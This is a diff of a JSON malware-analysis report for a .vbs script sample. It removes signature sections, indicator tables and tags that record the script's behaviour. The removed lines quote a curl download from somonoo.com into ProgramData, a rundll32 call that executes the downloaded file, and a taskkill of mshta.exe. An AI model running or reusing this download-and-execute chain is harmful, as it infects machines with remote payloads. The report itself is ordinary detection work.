@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1633,
+    "score": 511,
     "sections": [
       {
         "auto_collapse": false,
@@ -202,7 +202,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\t\tActiveXObject(WScript.Shell)\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tActiveXObject(wscript.shell)\n\t\tActiveXObject(shell.application)\n\t\tvar axqKhseWy = new ActiveXObject('WScript.Shell')",
+        "body": "JavaScript creates an ActiveXObject\n\t\tvar axqKhseWy = new ActiveXObject('WScript.Shell')",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -222,287 +222,6 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: ActiveXObject",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[20]()\n\t\tnew WScript.Shell[22]()",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "creates_wsh_object": 10
-          },
-          "signatures": {
-            "creates_wsh_object": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: CreatesWshObject",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 500,
-          "score_map": {
-            "runs_executable": 500
-          },
-          "signatures": {
-            "runs_executable": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: RunsExecutable",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "runs_shell": 10
-          },
-          "signatures": {
-            "runs_shell": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: RunsShell",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[23].shellexecute(\"rundll32\", \"C:\\ProgramData\\aj0iG.png,Wind\", \"\", \"open\", 3)",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 100,
-          "score_map": {
-            "runs_shell_application": 100
-          },
-          "signatures": {
-            "runs_shell_application": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: RunsShellApplication",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": null,
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "IOCs extracted by Box.js",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "HKCU\\SOFTWARE\\cqptlz\\ug9o\\b8kvyy",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": null,
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "registry_key": [
-              "HKCU\\SOFTWARE\\cqptlz\\ug9o\\b8kvyy"
-            ]
-          }
-        },
-        "title_text": "The script read the following registry keys",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "HKCU\\SOFTWARE\\cqptlz\\ug9o\\b8kvyy",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": null,
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "registry_key": [
-              "HKCU\\SOFTWARE\\cqptlz\\ug9o\\b8kvyy"
-            ]
-          }
-        },
-        "title_text": "The script wrote the following registry keys",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "ioc": "google.com",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "somonoo.com",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "https://google.com",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "https://somonoo.com/6WB/i.gif",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "/6WB/i.gif",
-            "ioc_type": "uri_path"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "ioc_type",
-            "ioc"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "static": {
-              "domain": [
-                "google.com",
-                "somonoo.com"
-              ],
-              "uri": [
-                "https://google.com",
-                "https://somonoo.com/6WB/i.gif"
-              ],
-              "uri_path": [
-                "/6WB/i.gif"
-              ]
-            }
-          }
-        },
-        "title_text": "MalwareJail extracted the following IOCs",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "ioc": "somonoo.com",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "https://somonoo.com/6WB/i.gif",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "/6WB/i.gif",
-            "ioc_type": "uri_path"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "ioc_type",
-            "ioc"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 13,
-          "score": 500,
-          "score_map": {
-            "wscript_curl_url": 500
-          },
-          "signatures": {
-            "wscript_curl_url": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "process": {
-              "command_line": [
-                "curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gif",
-                "rundll32 C:\\ProgramData\\aj0iG.png,Wind ",
-                "taskkill /f /im mshta.exe"
-              ]
-            }
-          },
-          "network": {
-            "dynamic": {
-              "domain": [
-                "somonoo.com"
-              ],
-              "uri": [
-                "https://somonoo.com/6WB/i.gif"
-              ],
-              "uri_path": [
-                "/6WB/i.gif"
-              ]
-            }
-          }
-        },
-        "title_text": "IOCs extracted from WScript",
         "zeroize_on_tag_safe": false
       },
       {
@@ -544,10 +263,6 @@
       {
         "name": "4WMuxh4fJLKF2jcuFab9oI.vbs",
         "sha256": "df4cd52df647bdca243a532dd3e2425b200db9ec71ba96872e93463a90e7d079"
-      },
-      {
-        "name": "extracted_wscript.bat",
-        "sha256": "fd2c12eb7e595d075dba3ca6ecf8116bee5191e97db673c85c3ac4152891b2c2"
       }
     ],
     "supplementary": [
@@ -566,47 +281,9 @@
       },
       {
         "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
-      {
-        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "active_x_object"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "creates_wsh_object"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "runs_executable"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "runs_shell"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "runs_shell_application"
         ]
       },
       {
@@ -615,51 +292,9 @@
         "signatures": [
           "suspicious_url_found"
         ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 13,
-        "signatures": [
-          "wscript_curl_url"
-        ]
       }
     ],
     "tags": {
-      "dynamic.process.command_line": [
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_curl_url"
-          ],
-          "value": "curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gif"
-        },
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_curl_url"
-          ],
-          "value": "rundll32 C:\\ProgramData\\aj0iG.png,Wind "
-        },
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_curl_url"
-          ],
-          "value": "taskkill /f /im mshta.exe"
-        }
-      ],
-      "dynamic.registry_key": [
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "HKCU\\SOFTWARE\\cqptlz\\ug9o\\b8kvyy"
-        },
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "HKCU\\SOFTWARE\\cqptlz\\ug9o\\b8kvyy"
-        }
-      ],
       "file.behavior": [
         {
           "heur_id": null,
@@ -674,68 +309,21 @@
           "value": "685bfde03eb646c27ed565881917c71c"
         }
       ],
-      "network.dynamic.domain": [
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_curl_url"
-          ],
-          "value": "somonoo.com"
-        }
-      ],
-      "network.dynamic.uri": [
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_curl_url"
-          ],
-          "value": "https://somonoo.com/6WB/i.gif"
-        }
-      ],
-      "network.dynamic.uri_path": [
-        {
-          "heur_id": 13,
-          "signatures": [
-            "wscript_curl_url"
-          ],
-          "value": "/6WB/i.gif"
-        }
-      ],
       "network.static.domain": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "google.com"
-        },
         {
           "heur_id": 12,
           "signatures": [
             "suspicious_url_found"
           ],
-          "value": "somonoo.com"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
           "value": "somonoo.com"
         }
       ],
       "network.static.uri": [
         {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://google.com"
-        },
-        {
           "heur_id": 12,
           "signatures": [
             "suspicious_url_found"
           ],
-          "value": "https://somonoo.com/6WB/i.gif"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
           "value": "https://somonoo.com/6WB/i.gif"
         }
       ],
@@ -745,11 +333,6 @@
           "signatures": [
             "suspicious_url_found"
           ],
-          "value": "/6WB/i.gif"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
           "value": "/6WB/i.gif"
         }
       ]
